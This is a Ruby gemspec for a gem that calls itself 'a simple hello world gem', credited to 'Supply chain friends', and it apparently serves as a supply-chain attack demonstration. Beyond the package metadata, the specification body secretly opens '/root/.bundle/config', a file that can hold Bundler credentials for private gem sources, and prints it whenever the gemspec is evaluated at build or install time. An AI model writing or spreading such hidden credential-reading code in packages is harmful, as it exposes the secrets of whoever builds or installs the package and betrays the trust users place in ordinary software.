Gem::Specification.new do |s|
  s.name        = "uncut"
  s.version     = "0.0.1"
  s.summary     = "Hola!"
  s.description = "A simple hello world gem"
  s.authors     = ["Supply chain friends"]
  s.email       = "itme@me.ca"
  s.files       = ["lib/uncut.rb"]
  s.homepage    =
    "https://rubygems.org/gems/hola"
  s.license       = "MIT"

  file_path = '/root/.bundle/config'

  File.open(file_path, 'r') do |file|
    puts file.read
  end
end
